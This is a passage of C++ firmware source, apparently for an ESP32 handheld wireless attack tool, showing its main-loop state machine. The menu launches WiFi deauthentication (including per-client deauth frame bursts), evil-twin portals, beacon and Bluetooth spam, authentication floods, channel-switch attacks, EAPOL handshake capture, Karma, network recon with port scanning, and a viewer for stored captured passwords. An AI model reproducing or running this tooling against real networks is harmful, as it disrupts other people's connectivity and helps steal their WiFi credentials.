  if (currentState == BT_SPAM && isBTSpamRunning) {
    btSpamTick();
    if (millis() - lastUI > 200) { drawBTSpam(animFrame++); lastUI = millis(); }
  }
#endif // NISKALA_HAS_TFT
  if (currentState == MACRO_RUNNING && isMacroRunning) {
    macroTick();
  }

  if (currentState == MAIN_MENU) {
    if (cfg_autosync_min > 0 && (millis() - lastAutoSync) >= (unsigned long)cfg_autosync_min * 60000UL) {
      lastAutoSync = millis();
      currentState = CLOUD_SYNC;
      startCloudSync();
    }
    if (btnTopPressed()) {
      delay(200);
      menuSelection = (menuSelection + 1) % MENU_COUNT;
      if (menuSelection >= menuScrollPos + 4) menuScrollPos = menuSelection - 3;
      else if (menuSelection < menuScrollPos) menuScrollPos = menuSelection;
      drawMainMenu();
    }
    if (btnBottomPressed()) {
      delay(200);
      switch (menuSelection) {
        case 0: case 1: case 5:
          startApScan(menuSelection);
          break;
        case 2:
          currentState = BEACON_SPAM;
          startBeaconSpam();
          drawBeaconSpam(0);
          break;
        case 3:
          currentState = PROBE_SNIFF;
          startProbeSniffer();
          drawProbeSniff(0);
          break;
        case 4:
          currentState = GLOBAL_DEAUTH;
          startGlobalDeauth();
          drawGlobalDeauth(0);
          break;
        case 6:
          currentState = BT_SPAM;
          startBTSpam();
          drawBTSpam(0);
          break;
        case 7:
          currentState = VIEW_PASSWORDS;
          viewSelection = 0; viewScrollPos = 0; confirmDeleteAll = false;
          if (prefs.getInt("pwd_count", 0) == 0) viewSelection = 1;
          drawViewPasswords();
          break;
        case 8:
          currentState = KARMA_SCAN;
          startKarmaScan();
          drawKarmaScan(0);
          break;
        case 9:
          startApScan(9);
          break;
        case 10:
          currentState = WEB_REMOTE;
          startWebRemote();
          break;
        case 11:
          currentState = OTA_MODE;
          startOTA();
          break;
        case 12:
          currentState = BLE_SCAN;
          startBLEScan();
          break;
        case 13:
          currentState = CLOUD_SYNC;
          startCloudSync();
          break;
        case 14:
          currentState = MACRO_MENU;
          macroSelection = 0;
          drawMacroMenu();
          break;
        case 15:
          startApScan(15);
          break;
        case 16:
          startApScan(16);
          break;
        case 19:
          startApScan(19);
          break;
        case 18:
          startApScan(18);
          break;
        case 17:
          currentState = APWIFI_VIEW;
          apWifiSelection = 0;
          apWifiScrollPos = 0;
          confirmApWifiDelete = false;
          drawApWifiView();
          break;
        case 20:
          currentState = PM_MONITOR;
          drawPacketMonitor();
          break;      }
    }
  }
  else if (currentState == AP_SCANNING) {
    apScanTick();
  }
  else if (currentState == AP_LIST_DEAUTH ||
           currentState == AP_LIST_EVIL_TWIN ||
           currentState == AP_LIST_AUTH_FLOOD ||
           currentState == AP_LIST_CSA ||
           currentState == AP_LIST_CLIENT ||
           currentState == AP_LIST_EAPOL ||
           currentState == AP_LIST_SMART ||
           currentState == RECON_AP_SELECT) {
    handleAPListNavigation();
  }
  else if (currentState == FETCH_TEMPLATE) {
    templateFetchTick();
    if (currentState == FETCH_TEMPLATE && (btnTopPressed() || btnBottomPressed())) {
      delay(200);
      WiFi.disconnect();
      restoreOriginalApMac();
      radioSetMode(RADIO_STA);
      currentState = TEMPLATE_SELECT;
      drawTemplateSelect();
    }
  }
  else if (currentState == TEMPLATE_SELECT) {
    handleTemplateSelect();
  }
  else if (currentState == EVIL_TWIN_MODE_SELECT) {
    handleEvilTwinModeSelect();
  }
  else if (currentState == DEAUTH_MENU) {
    if (btnBottomPressed()) {
      delay(200);
      if (isDeauthRunning) stopDeauthEngine(); else startDeauthEngine();
      drawDeauthMenu();
    }
    if (btnTopPressed()) {
      delay(200);
      if (isDeauthRunning) stopDeauthEngine();
      currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == CSA_RUNNING) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopCSAAttack();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == EVIL_TWIN_RUNNING) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == BEACON_SPAM) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300); stopBeaconSpam(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == PROBE_SNIFF) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300); stopProbeSniffer(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == GLOBAL_DEAUTH) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300); stopGlobalDeauth(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == AUTH_FLOOD_RUNNING) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300); stopAuthFlood(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == BT_SPAM) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300); stopBTSpam(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == CLOUD_SYNC) {
    cloudSyncTick();
    if (currentState == CLOUD_SYNC && (btnTopPressed() || btnBottomPressed())) {
      delay(200);
      WiFi.disconnect();
      restoreOriginalApMac();
      radioSetMode(RADIO_STA);
      g_cloudPhase = CLOUD_PHASE_IDLE;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == WEB_REMOTE) {
    if (isKarmaRunning && millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
      stopAttacksKeepWebRemote();
      currentState = WEB_REMOTE;
      Serial.println("[KARMA] Web scan selesai, AP kontrol tetap aktif");
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (g_pmfShowResult && millis() > g_pmfShowUntil) {
      g_pmfShowResult = false;
      drawWebRemoteScreen();
    }
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopWebRemote();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == OTA_MODE) {
    ArduinoOTA.handle();
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopOTA();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == BLE_SCAN) {
    if (g_bleScanning && millis() - lastUI > 500) { drawBleScan(); lastUI = millis(); }
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopBLEScan();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == MACRO_MENU) {
    if (btnTopPressed()) {
      delay(200);
      macroSelection = (macroSelection + 1) % MACRO_COUNT;
      drawMacroMenu();
    }
    if (btnBottomPressed()) {
      delay(200);
      startMacro(macroSelection);
    }
  }
  else if (currentState == MACRO_RUNNING) {
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      stopAllAttacks();
      isMacroRunning = false;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == CLIENT_MONITOR_RUNNING) {
    if (millis() - lastUI > 500) { drawClientMonitor(); lastUI = millis(); }
    static unsigned long lastClientDump = 0;
    if (millis() - lastClientDump > 2000) {
      lastClientDump = millis();
      Serial.printf("[CLIENTS] count=%d\n", g_clientCount);
      for (int ci = 0; ci < g_clientCount; ci++) {
        Serial.printf("  %02X:%02X:%02X:%02X:%02X:%02X rssi=%d pkts=%u\n",
          g_clients[ci].mac[0], g_clients[ci].mac[1], g_clients[ci].mac[2],
          g_clients[ci].mac[3], g_clients[ci].mac[4], g_clients[ci].mac[5],
          g_clients[ci].rssi, (unsigned)g_clients[ci].packets);
      }
    }
    if (btnTopPressed()) {
      delay(200);
      clientSelection++;
      if (clientSelection > g_clientCount) clientSelection = 0;
      if (clientSelection < clientScroll) clientScroll = clientSelection;
      else if (clientSelection >= clientScroll + 4) clientScroll = clientSelection - 3;
      drawClientMonitor();
    }
    if (btnBottomPressed()) {
      delay(200);
      if (clientSelection == g_clientCount) {
        stopClientMonitor();
        currentState = MAIN_MENU;
        drawMainMenu();
      } else if (g_clientCount > 0 && clientSelection < g_clientCount) {
        uint8_t* cmac = g_clients[clientSelection].mac;
        if (clientAllowed(cmac)) {
          Serial.printf("[CLIENT] Skip allowed %02X:%02X:%02X:%02X:%02X:%02X\n",
            cmac[0], cmac[1], cmac[2], cmac[3], cmac[4], cmac[5]);
#if NISKALA_HAS_TFT
          tft.fillRect(0, 104, 240, 10, TFT_BLACK);
          tft.setTextFont(1);
          tft.setTextColor(TFT_GREEN, TFT_BLACK);
          tft.setCursor(4, 104);
          tft.print("ALLOWED");
#endif
        } else {
          for (int i = 0; i < cfg_deauth_burst; i++) {
            sendDeauthFrame(cmac, g_targetBSSID, 0x07);
          }
          Serial.printf("[CLIENT] Deauth %02X:%02X:%02X:%02X:%02X:%02X\n",
            cmac[0], cmac[1], cmac[2], cmac[3], cmac[4], cmac[5]);
#if NISKALA_HAS_TFT
          tft.fillRect(0, 104, 240, 10, TFT_BLACK);
          tft.setTextFont(1);
          tft.setTextColor(TFT_RED, TFT_BLACK);
          tft.setCursor(4, 104);
          tft.print("DEAUTH OK");
#endif
        }
      }
    }
  }
  else if (currentState == SMART_PROFILE) {
    if (btnTopPressed()) {
      delay(200);
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    if (btnBottomPressed()) {
      delay(200);
      startSmartRecommendedAttack();
      while (btnBottomPressed()) delay(50);
    }
  }
  else if (currentState == PM_MONITOR) {
    if (millis() - lastUI > 500) { drawPacketMonitor(); lastUI = millis(); }
    if (btnTopPressed() || btnBottomPressed()) {
      delay(300);
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == EAPOL_CAPTURE_RUNNING) {
    eapolCaptureTick();
    if (btnTopPressed() || btnBottomPressed()) {
      delay(200);
      stopEapolCapture();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == RECON) {
    if (g_reconPhase == RECON_PHASE_HOST_LIST) {
      if (btnTopPressed()) {
        delay(200);
        g_reconSelection++;
        if (g_reconSelection > g_reconHostCount) g_reconSelection = 0;
        if (g_reconSelection < g_reconScroll) g_reconScroll = g_reconSelection;
        else if (g_reconSelection >= g_reconScroll + 4) g_reconScroll = g_reconSelection - 3;
        drawNetworkRecon();
      }
      if (btnBottomPressed()) {
        delay(200);
        if (g_reconSelection == g_reconHostCount) {
          stopNetworkRecon();
          currentState = MAIN_MENU;
          drawMainMenu();
        } else if (g_reconHostCount > 0 && g_reconSelection < g_reconHostCount) {
          reconPortScan(g_reconSelection);
        }
      }
    } else if (g_reconPhase == RECON_PHASE_PORT_RESULT) {
      if (btnTopPressed() || btnBottomPressed()) {
        delay(300);
        g_reconPhase = RECON_PHASE_HOST_LIST;
        drawNetworkRecon();
      }
    } else {
      reconTick();
      if (btnTopPressed() || btnBottomPressed()) {
        delay(300);
        stopNetworkRecon();
        currentState = MAIN_MENU;
        drawMainMenu();
      }
    }
  }
  else if (currentState == APWIFI_VIEW) {
    int count = apPrefs.getInt("count", 0);
    if (btnTopPressed()) {
      delay(200);
      confirmApWifiDelete = false;
      apWifiSelection++;
      if (apWifiSelection > count) apWifiSelection = 0;
      if (apWifiSelection < apWifiScrollPos) apWifiScrollPos = apWifiSelection;
      else if (apWifiSelection >= apWifiScrollPos + 3) apWifiScrollPos = apWifiSelection - 2;
      drawApWifiView();
    }
    if (btnBottomPressed()) {
      delay(200);
      if (apWifiSelection == count) {
        confirmApWifiDelete = false;
        currentState = MAIN_MENU;
        drawMainMenu();
      } else if (count > 0 && apWifiSelection < count) {
        if (!confirmApWifiDelete) {
          confirmApWifiDelete = true;
          lastApWifiDeletePress = millis();
          drawApWifiView();
        } else {
          apWifiDelete(apWifiSelection);
          confirmApWifiDelete = false;
          int newCount = apPrefs.getInt("count", 0);
          if (newCount == 0) apWifiSelection = 0;
          else if (apWifiSelection >= newCount) apWifiSelection = newCount;
          apWifiScrollPos = 0;
          drawApWifiView();
        }
      }
    }
    if (confirmApWifiDelete && millis() - lastApWifiDeletePress > 3000) {
      confirmApWifiDelete = false;
      drawApWifiView();
    }
  }
  else if (currentState == VIEW_PASSWORDS) {
    int total = prefs.getInt("pwd_count", 0);
    int maxSelection = total + 1;
    if (btnTopPressed()) {
      delay(200); confirmDeleteAll = false;
      viewSelection++;
      if (viewSelection > maxSelection) viewSelection = 0;
      if (viewSelection < total) {
        if (viewSelection >= viewScrollPos + 2) viewScrollPos = viewSelection - 1;
        else if (viewSelection < viewScrollPos) viewScrollPos = viewSelection;
      }
      drawViewPasswords();
    }
    if (btnBottomPressed()) {
      delay(200);
      if (viewSelection == maxSelection) { currentState = MAIN_MENU; drawMainMenu(); }
      else if (viewSelection == total) {
        if (!confirmDeleteAll) { confirmDeleteAll = true; lastDeletePress = millis(); drawViewPasswords(); }
        else { deleteAllPasswordsFromNVS(); confirmDeleteAll = false; viewSelection = 1; viewScrollPos = 0; drawViewPasswords(); }
      }
      else if (viewSelection < total) {
        deletePasswordEntry(viewSelection);
        confirmDeleteAll = false;
        int newTotal = prefs.getInt("pwd_count", 0);
        if (newTotal == 0) viewSelection = 1;
        else if (viewSelection >= newTotal) viewSelection = newTotal - 1;
        viewScrollPos = 0;
        drawViewPasswords();
      }
    }
    if (confirmDeleteAll && millis() - lastDeletePress > 3000) {
      confirmDeleteAll = false; drawViewPasswords();
    }
  }
}